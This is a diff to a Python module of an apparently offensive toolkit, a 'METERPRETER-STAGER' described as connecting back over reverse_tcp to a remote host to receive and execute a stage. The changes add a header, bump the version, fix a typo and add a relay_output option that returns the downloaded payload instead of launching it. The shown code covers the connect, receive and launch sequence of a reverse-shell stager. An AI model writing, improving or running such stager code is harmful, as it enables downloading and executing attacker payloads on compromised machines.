@@ -1,3 +1,8 @@
+########################################################
+### Meterpreter Module
+### Status: untested
+########################################################
+
 from utils.helper import nstate as nstate
 from utils.windef import *
 from utils.winconst import *
@@ -17,15 +22,16 @@ def register_arguments(parser):
     grp.add_argument('-s', '--sleep', default=0, type=int, required=True, help='Sleep for x seconds before the stage is executed')
     grp.add_argument('-t', '--timeout', default=30, type=int, help='Connect timeout in seconds, 30 seconds is the default')
 
-class stage():
+class module:
     
     Author          = 'raptor@0xdeadbeef.info, psycore8'
     Description     = 'Connect back (reverse_tcp) to remote host and receive a stage'
-    Version         = '1.2.0'
+    Version         = '1.2.2'
     DisplayName      = 'METERPRETER-STAGER'
     payload         = any
     payload_size    = int
     sock            = any
+    relay_output    = False
 
     def __init__(self, remote_host=str, remote_port=int, timeout=int, architecture=str, sleeptime=int):
         self.remote_host = remote_host
@@ -49,7 +55,7 @@ class stage():
             'inj.ok'        : f'{nstate.s_ok} Looks good!',
             'inj.fail'      : f'{nstate.s_fail} Payload not executed',
             'post.done'     : f'{nstate.s_ok} DONE!',
-            'error.con'     : f'{nstate.s_fail} Connevtion failed',
+            'error.con'     : f'{nstate.s_fail} Connection failed',
             'error.stage_ok': f'{nstate.s_fail} Error during download'
         }
         print(messages.get(message_type, f'{message_type} - this message type is unknown'))
@@ -64,7 +70,7 @@ class stage():
         if con == 0:
             self.msg('proc.con')
         else:
-            self.msg('error.con')
+            self.msg('error.con', True)
 
     def ReceivePayload(self):
         # get 4-byte payload length
@@ -116,6 +122,10 @@ class stage():
         self.msg('pre.head')
         self.CreateSocket()
         self.ReceivePayload()
-        self.LaunchStage()
+        if self.relay_output:
+            print('\n')
+            return self.payload
+        else:
+            self.LaunchStage()
 
     
